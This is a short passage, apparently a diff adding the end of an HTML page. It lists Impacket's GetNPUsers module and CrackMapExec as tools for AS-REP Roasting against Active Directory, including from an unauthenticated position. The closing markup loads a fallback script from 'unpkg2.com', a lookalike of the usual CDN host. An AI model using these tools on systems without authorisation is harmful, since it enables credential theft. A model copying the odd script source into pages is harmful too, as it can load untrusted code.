id="30c79e9a-d7c9-8008-9aa0-db3ffe83cea5" class="numbered-list" start="2"><li><strong>Impacket</strong>: This suite includes the <strong>GetNPUsers</strong> module, which can be used to conduct AS-REP Roasting from a non-domain joined system and from an unauthenticated perspective.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-803d-9e0e-d1cb503d1610" class="numbered-list" start="3"><li><strong>CrackMapExec</strong>: This tool can also perform AS-REP Roasting from authenticated or unauthenticated context.</li></ol></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto">
+        </section>
+      </article>
+    </div>
+
+    <script src="../assets/js/script.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg2.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  </body>
+</html>
